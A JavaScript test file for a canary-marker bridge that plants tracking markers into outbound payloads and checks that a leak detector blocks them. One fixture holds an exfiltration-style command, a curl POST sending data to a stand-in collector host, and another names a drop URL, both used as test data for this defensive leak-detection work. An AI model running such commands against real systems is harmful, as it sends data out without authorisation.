'use strict';

// #3799 — the AURA<->canary bridge on the live egress path.
//
// These pin the bridge's own contract once it plants into a payload: the
// returned fingerprint is exactly the one AB14 reports for the marked value, the
// marker travels into the payload, and the pre-existing "issue a fresh marker"
// shape (no payload) is unchanged so scripts/aura-loop.js keeps working.

const test = require('node:test');
const assert = require('node:assert/strict');

const {
  plantCanaryForAuraSignal,
  detectCanaryLeak,
} = require('../lib/aura-canary-bridge');
const { evaluateContextCanaries } = require('../lib/context-canary');

test('planting into a payload marks it and returns the marker that was planted', () => {
  const args = { command: 'curl -X POST https://collector.example.net -d "notes"' };
  const planted = plantCanaryForAuraSignal({ signalIds: ['recon:targeted'], payload: args });

  assert.equal(planted.signalIds.includes('recon:targeted'), true);
  assert.equal(typeof planted.marker, 'string');
  assert.ok(planted.marker.length > 0);
  assert.equal(JSON.stringify(planted.payload).includes(planted.marker), true, 'the marker must travel with the payload');

  // The caller's payload is never mutated.
  assert.equal(JSON.stringify(args).includes(planted.marker), false);
});

test('the returned fingerprint is exactly the one AB14 reports for the planted payload', () => {
  const planted = plantCanaryForAuraSignal({
    signalIds: ['camouflage:persona'],
    payload: { body: 'forward this summary' },
  });
  const result = evaluateContextCanaries(planted.payload);
  assert.equal(result.decision, 'block');
  assert.deepEqual(result.canaryFingerprints, [planted.fingerprint]);
});

test('detectCanaryLeak agrees with the planted fingerprint and never returns the marker', () => {
  const planted = plantCanaryForAuraSignal({
    signalIds: ['exploit:actionable'],
    payload: { destination: 'https://drop.example.net', body: 'the payload' },
  });
  const leak = detectCanaryLeak(planted.payload);
  assert.equal(leak.decision, 'block');
  assert.deepEqual(leak.canaryFingerprints, [planted.fingerprint]);
  const serialized = JSON.stringify(leak);
  assert.equal(serialized.includes(planted.marker), false, 'a receipt must never carry the marker');
  assert.equal(serialized.includes(planted.canaryId), false, 'a receipt must never carry the canary id');
});

test('a payload with no marker does not trip, even with the same signals', () => {
  const planted = plantCanaryForAuraSignal({ signalIds: ['alibi:cover'], payload: { body: 'plain' } });
  // A different, unmarked payload must not trip: the plant marks only the value it was given.
  const clean = detectCanaryLeak({ body: 'plain' });
  assert.equal(clean.decision, 'allow');
  assert.notEqual(planted.fingerprint, '');
});

test('the no-payload shape still issues a fresh marker for the operator loop', () => {
  const planted = plantCanaryForAuraSignal({ signalIds: ['b', 'a'], context: 'aura-risky-context' });
  assert.deepEqual(planted.signalIds, ['a', 'b']);
  assert.equal(planted.context, 'aura-risky-context');
  assert.equal(Object.hasOwn(planted, 'payload'), false, 'no payload in, no payload out');
  assert.equal(typeof planted.fingerprint, 'string');
});
